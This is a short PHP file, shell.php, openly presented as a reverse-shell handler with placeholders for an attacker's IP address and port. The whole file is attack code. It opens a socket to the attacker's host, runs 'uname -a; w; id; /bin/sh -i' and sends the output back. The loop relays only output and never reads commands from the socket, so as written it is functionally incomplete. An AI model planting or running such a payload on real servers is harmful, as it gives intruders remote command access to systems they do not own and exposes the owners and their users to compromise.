<?php
// shell.php — Reverse-shell handler
set_time_limit(0);

$ip   = 'YOUR_ATTACKER_IP';   // e.g. 172.31.107.153
$port = YOUR_ATTACKER_PORT;   // e.g. 8788

$shell = 'uname -a; w; id; /bin/sh -i';

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    error_log("Connection failed: $errstr ($errno)");
    exit(1);
}

fwrite($sock, "► Connected: " . php_uname() . "\n");

$descriptorspec = [
    0 => ["pipe", "r"],
    1 => ["pipe", "w"],
    2 => ["pipe", "w"],
];
$proc = proc_open($shell, $descriptorspec, $pipes);
if (is_resource($proc)) {
    while (!feof($pipes[1])) {
        fwrite($sock, fgets($pipes[1], 1400));
    }
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($proc);
    fclose($sock);
}
?>
